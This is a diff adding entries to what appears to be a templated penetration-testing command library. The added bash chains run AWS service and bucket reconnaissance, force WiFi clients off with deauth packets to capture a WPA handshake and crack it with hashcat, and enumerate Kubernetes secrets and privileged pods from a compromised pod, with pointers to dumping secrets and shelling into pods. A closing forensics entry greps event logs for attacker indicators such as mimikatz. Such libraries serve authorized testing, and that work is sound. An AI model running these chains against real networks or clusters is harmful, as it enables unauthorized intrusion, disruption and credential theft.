@@ -168,3 +168,47 @@ target={{TARGET:ip}}; user={{USER:str}}; pass={{PASS:str}}; victim={{VICTIM:str:
 ```
 
 <!-- meta: risk=high | phase=attack | tags=ad,delegation,s4u,kerberos,nxc,chain -->
+
+---
+
+## chain cloud aws full recon
+Identity check → cloudfox all-checks (comprehensive service inventory) → s3scanner over every bucket the profile can list → follow-up hint for scoutsuite if you want the full audit (15-30 min).
+
+```bash
+profile={{PROFILE:str:default}}; region={{REGION:str:us-east-1}}; out={{OUT:dir:aws-recon}}; mkdir -p "$out" && cd "$out" || exit 1; echo '[+] identity check'; aws --profile "$profile" sts get-caller-identity; echo; echo '[+] cloudfox all-checks (comprehensive)'; cloudfox aws --profile "$profile" --region "$region" all-checks 2>&1 | tail -30; echo; echo '[+] s3scanner over every listed bucket'; aws --profile "$profile" s3api list-buckets --query 'Buckets[].Name' --output text | tr '\t' '\n' | s3scanner scan --stdin 2>&1 | tail -20; echo; echo "[+] follow-up: q > 'scoutsuite' for full audit (15-30min)"
+```
+
+<!-- meta: risk=low | phase=recon | tags=aws,cloud,cloudfox,s3scanner,scoutsuite,chain -->
+
+---
+
+## chain wireless capture and crack
+Monitor-mode on the interface → 60 s capture on the target BSSID → deauth to force a client-to-AP handshake → convert to hashcat's 22000 format → hashcat crack against your wordlist → show cracked line. Prints the cleanup command to un-monitor the interface when done.
+
+```bash
+iface={{IFACE:str:wlan0}}; bssid={{BSSID:str}}; channel={{CHANNEL:int:6}}; wordlist={{WORDLIST:file:/usr/share/wordlists/rockyou.txt}}; cap={{OUT:file:handshake}}; echo "[+] monitor mode on $iface"; sudo airmon-ng check kill; sudo airmon-ng start "$iface"; mon="${iface}mon"; echo "[+] capture 60s on $mon ch=$channel bssid=$bssid"; sudo timeout 60 airodump-ng --bssid "$bssid" -c "$channel" -w "$cap" "$mon" & sleep 5; echo '[+] deauth (3 packets) to force handshake'; sudo aireplay-ng --deauth 3 -a "$bssid" "$mon"; wait; echo; echo '[+] convert cap → hashcat 22000'; hcxpcapngtool -o "${cap}.hc22000" "${cap}"-01.cap 2>&1 | tail -5; echo; echo '[+] hashcat mode 22000 crack'; hashcat -m 22000 "${cap}.hc22000" "$wordlist" --quiet -O 2>&1 | tail -5; echo; echo '[+] cracked:'; hashcat -m 22000 "${cap}.hc22000" --show 2>/dev/null; echo; echo "[+] cleanup: sudo airmon-ng stop $mon"
+```
+
+<!-- meta: risk=medium | phase=attack | tags=wireless,wpa,airmon,airodump,aireplay,hashcat,chain -->
+
+---
+
+## chain kubernetes attack path
+From inside a compromised pod (or with a mounted serviceaccount token) — auth-check → secret enum → dangerous-pod discovery (privileged / hostNetwork / hostPID / hostIPC) → serviceaccount inventory. Prints follow-up q shortcuts for the natural next steps.
+
+```bash
+echo '[+] auth can-i sweep'; kubectl auth can-i --list 2>&1 | tail -20; echo; echo '[+] secrets across all namespaces'; kubectl get secrets -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,TYPE:.type' 2>&1 | head -30; echo; echo '[+] dangerous pods (privileged / hostNetwork / hostPID / hostIPC)'; kubectl get pods -A -o json 2>/dev/null | jq -r '.items[] | select(.spec.hostNetwork==true or .spec.hostPID==true or .spec.hostIPC==true or ((.spec.containers // [])[].securityContext.privileged==true)) | "  \(.metadata.namespace)/\(.metadata.name)"' | head -20; echo; echo '[+] serviceaccount inventory'; kubectl get sa -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,SECRETS:.secrets[*].name' 2>&1 | head -20; echo; echo "[+] follow-up: q > 'extract secret decode' to dump one secret"; echo "[+] follow-up: q > 'exec shell into pod' to jump onto a privileged pod above"
+```
+
+<!-- meta: risk=medium | phase=post | tags=kubernetes,k8s,kubectl,privilege,secrets,chain -->
+
+---
+
+## chain forensics quick triage windows evtx
+Given a directory of .evtx logs (Sherlock-style disk image) → chainsaw sigma hunt → shimcache extraction → grep raw strings for common attacker IOCs (cmd/powershell/reg add/sc create/mimikatz/etc). All output to a triage/ dir you can review afterwards.
+
+```bash
+evtx_dir={{EVTX_DIR:dir:./Windows/System32/winevt/Logs}}; out={{OUT:dir:./triage}}; mkdir -p "$out" && cd "$out" || exit 1; echo '[+] chainsaw hunt (sigma rules)'; chainsaw hunt "$evtx_dir" --sigma /usr/share/chainsaw/sigma --mapping /usr/share/chainsaw/mappings/sigma-event-logs-all.yml --output "$out/chainsaw-hunt.json" 2>&1 | tail -20; echo; echo '[+] shimcache extract'; chainsaw analyse shim-cache "$evtx_dir" --output "$out/shimcache.csv" 2>&1 | tail -10; echo; echo '[+] strings grep — common attacker IOCs in evtx'; strings "$evtx_dir"/*.evtx 2>/dev/null | grep -iE 'cmd\.exe|powershell|net user|reg add|sc create|schtasks|whoami|mimikatz|invoke-' | sort -u | head -20; echo; echo "[+] output dir: $out/"
+```
+
+<!-- meta: risk=low | phase=dfir | tags=forensics,dfir,chainsaw,evtx,sigma,shimcache,ioc,chain -->
